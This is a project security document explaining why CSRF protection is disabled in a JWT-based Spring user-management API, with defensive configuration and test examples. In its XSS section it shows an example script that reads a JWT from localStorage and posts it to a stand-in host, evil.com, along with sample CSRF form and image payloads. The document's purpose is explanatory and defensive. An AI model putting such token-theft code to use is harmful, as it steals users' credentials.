# CSRF (Cross-Site Request Forgery) Security Analysis

## Current Status: CSRF Protection DISABLED

**Location**: `userManagement/src/main/java/com/ubik/usermanagement/infrastructure/config/SecurityConfig.java`

```java
.csrf(ServerHttpSecurity.CsrfSpec::disable) // CSRF disabled for stateless JWT API
```

## Why CSRF Protection is Disabled

### 1. Stateless JWT Architecture
This application uses JWT (JSON Web Tokens) for authentication, which is a **stateless** authentication mechanism:

- No session cookies are used
- No server-side session state
- Each request contains the authentication token
- Tokens are typically sent in `Authorization` header

### 2. CSRF Attack Prerequisites
CSRF attacks require:
1. **Session-based authentication** (cookies that are automatically sent by the browser)
2. **State-changing operations** that accept cookies for authentication
3. **No additional verification** beyond the cookie

### 3. Why JWT is Resistant to CSRF
With JWT authentication:
- Tokens are stored in memory or localStorage/sessionStorage
- Tokens are **not** automatically sent by the browser
- Tokens must be **explicitly** added to each request
- Malicious sites cannot access tokens due to Same-Origin Policy

## CSRF Protection Analysis by Attack Vector

### ❌ Classic CSRF Attack (Not Applicable)
```html
<!-- This attack DOES NOT work with JWT -->
<img src="https://api.example.com/api/user/delete" />
```
**Why it fails**: No JWT token is sent automatically with this request.

### ❌ Form-based CSRF (Not Applicable)
```html
<!-- This attack DOES NOT work with JWT -->
<form action="https://api.example.com/api/user/update" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```
**Why it fails**: The browser won't include the JWT token in the request.

### ⚠️ XSS-based Token Theft (Different Threat)
```javascript
// If XSS vulnerability exists
const token = localStorage.getItem('jwt_token');
fetch('https://evil.com/steal', { method: 'POST', body: token });
```
**This is NOT CSRF**, but **XSS + Token Theft**. Protection needed:
- Content Security Policy (CSP) ✅ Implemented
- Input validation ✅ Implemented
- Output encoding ✅ Angular handles this
- X-XSS-Protection header ✅ Implemented

## When CSRF Protection IS Needed

### Scenario 1: Cookie-based JWT
If JWT tokens are stored in **HttpOnly cookies**:
```java
// Example: JWT in cookie (NOT our current implementation)
Cookie cookie = new Cookie("jwt_token", token);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setSameSite(Cookie.SameSite.STRICT); // CSRF protection needed!
response.addCookie(cookie);
```

**If this is implemented**, enable CSRF protection:
```java
.csrf(csrf -> csrf
    .csrfTokenRepository(CookieServerCsrfTokenRepository.withHttpOnlyFalse())
)
```

### Scenario 2: Hybrid Authentication
If the application uses **both** JWT and session cookies:
- Enable CSRF protection
- Exclude JWT-only endpoints
- Protect session-based endpoints

## Security Best Practices for JWT (CSRF-Alternative Protection)

### 1. Secure Token Storage ✅

**Current Implementation**: Tokens returned in response body

**Frontend Best Practices**:
```javascript
// ✅ GOOD: Store in memory (most secure, lost on refresh)
let jwtToken = null;

async function login(username, password) {
    const response = await fetch('/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    });
    jwtToken = await response.text();
}

// ⚠️ ACCEPTABLE: sessionStorage (lost when tab closes)
sessionStorage.setItem('jwt_token', token);

// ❌ LEAST SECURE: localStorage (persists, vulnerable to XSS)
localStorage.setItem('jwt_token', token);
```

### 2. Token Transmission ✅

**Current Implementation**: Frontend should send tokens in headers

```javascript
// ✅ GOOD: Authorization header
fetch('/api/user/profile', {
    headers: {
        'Authorization': `Bearer ${jwtToken}`
    }
});

// ❌ BAD: Cookies (requires CSRF protection)
// Don't send JWT via cookies without CSRF protection
```

### 3. Token Validation ✅

**Current Implementation** in `JwtAdapter.java`:
- Signature verification ✅
- Expiration check ✅
- Username/subject validation ✅

### 4. CORS Configuration ✅

**Current Implementation**: Restricted origins
```yaml
allowed-origins: ${ALLOWED_ORIGINS:http://localhost:4200,http://localhost:3000}
```

This prevents cross-origin requests from unauthorized domains.

### 5. SameSite Cookie Attribute (If using cookies)

**Not currently applicable**, but if JWT is moved to cookies:
```java
cookie.setSameSite(Cookie.SameSite.STRICT); // or LAX
```

Options:
- `STRICT`: Cookie never sent on cross-site requests (best for CSRF)
- `LAX`: Cookie sent on "safe" cross-site requests (GET)
- `NONE`: Cookie sent on all requests (requires `Secure` flag)

## Double-Submit Cookie Pattern (Alternative)

If you want an extra layer of protection without full CSRF tokens:

1. Generate a random token
2. Send it both in a cookie and in the response body
3. Frontend stores body token and sends it in custom header
4. Backend validates cookie matches header

```java
// Example (not implemented, just for reference)
String csrfToken = UUID.randomUUID().toString();

// Set cookie
Cookie cookie = new Cookie("XSRF-TOKEN", csrfToken);
cookie.setHttpOnly(false); // JavaScript needs to read it
response.addCookie(cookie);

// Return in response
return Map.of("token", jwtToken, "csrfToken", csrfToken);
```

Frontend:
```javascript
fetch('/api/user/update', {
    headers: {
        'Authorization': `Bearer ${jwtToken}`,
        'X-XSRF-TOKEN': csrfToken // From response body
    }
});
```

## Monitoring and Detection

### 1. Log Suspicious Patterns
- Multiple failed authentication attempts
- Requests with tokens from different IPs
- Unusual user-agent changes

### 2. Implement Rate Limiting ⚠️
See `RATE_LIMITING_GUIDE.md` for implementation details.

### 3. Token Rotation
Implement short-lived access tokens + refresh tokens:
```java
// Example configuration
jwt:
  access-token-expiration: 900000  # 15 minutes
  refresh-token-expiration: 604800000  # 7 days
```

## Security Testing

### 1. Test JWT Cannot Be Stolen via CSRF
```bash
# This should fail (no token sent automatically)
curl -X POST https://api.example.com/api/user/delete
```

### 2. Test CORS Restrictions
```javascript
// From unauthorized origin, this should fail
fetch('https://api.example.com/api/user/profile', {
    headers: { 'Authorization': `Bearer ${token}` }
});
```

### 3. Test Token Validation
```bash
# Invalid token should be rejected
curl -H "Authorization: Bearer invalid_token" \
     https://api.example.com/api/user/profile
```

## Comparison: CSRF vs XSS Threats

### CSRF Attack (Not a concern with JWT in headers)
- **Requires**: Automatic credential submission (cookies)
- **Protection**: CSRF tokens, SameSite cookies
- **Our Status**: Not vulnerable (JWT in headers)

### XSS Attack (Main concern)
- **Requires**: JavaScript injection into your site
- **Impact**: Can steal JWT tokens from localStorage/sessionStorage
- **Protection**: 
  - CSP headers ✅
  - Input validation ✅
  - Output encoding ✅
  - HTTPOnly cookies (if using cookies)

## Recommendations

### Current Architecture (JWT in Headers)
✅ **No CSRF protection needed**  
✅ **Focus on XSS prevention** (already implemented)  
✅ **Implement rate limiting** (see RATE_LIMITING_GUIDE.md)  
✅ **Monitor for suspicious activity**

### If Moving to Cookie-based JWT
⚠️ **Enable CSRF protection**  
⚠️ **Use SameSite=Strict/Lax**  
⚠️ **Set HttpOnly flag**  
⚠️ **Set Secure flag** (HTTPS only)

### Additional Security Measures
1. **Implement token refresh mechanism**
2. **Add token blacklist** for logout
3. **Implement device fingerprinting**
4. **Add anomaly detection**
5. **Regular security audits**

## References

- [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Spring Security CSRF Protection](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html)
- [SameSite Cookie Specification](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

## Conclusion

**CSRF protection is intentionally disabled** because:
1. ✅ JWT authentication is stateless
2. ✅ Tokens are sent in headers, not cookies
3. ✅ No automatic credential submission
4. ✅ CORS protection is configured
5. ✅ XSS protection is implemented

This is a **security best practice** for stateless JWT APIs. The focus should be on:
- Preventing XSS attacks (already implemented)
- Implementing rate limiting (guide provided)
- Monitoring for suspicious activity
- Keeping dependencies updated
